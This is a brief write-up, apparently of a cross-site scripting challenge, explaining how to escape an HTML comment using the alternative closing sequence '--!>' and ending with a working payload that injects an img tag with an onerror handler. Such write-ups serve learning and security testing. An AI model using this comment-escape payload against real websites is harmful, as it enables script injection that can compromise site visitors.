This challenge requires us to escape the comment section.
At first I tried to do this by entering new line characters but that doesn't work.

In the end, it turns out we need to use another comment section ending tag to escape.

The usual comment syntax:
```html
<!-- comment here --> outside of the comment
```

The alternative way to end comment tag:
```html
<!-- comment here --!> outside of the comment
```

Payload:
```
--!> <img src=1 onerror=prompt(1)>
```